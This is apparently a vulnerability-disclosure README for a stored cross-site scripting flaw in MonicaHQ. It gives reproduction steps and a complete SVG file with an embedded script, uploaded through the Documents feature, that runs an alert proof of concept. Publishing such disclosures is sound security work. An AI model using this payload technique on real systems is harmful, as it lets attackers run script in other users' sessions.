# MonicaHQ XSS

## Exploitation of MonicaHQ XSS

- Create an account

- Create a contact

- In Documents, upload a malicious SVG file

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert("Monicahq XSS Poc");
  </script>
</svg>

```
- Access the uploaded file

![image](https://github.com/Crypt0Cr33py/monicahqvuln/assets/108440914/71f6ec20-148b-4973-ac42-83ae7a5c0ae6)
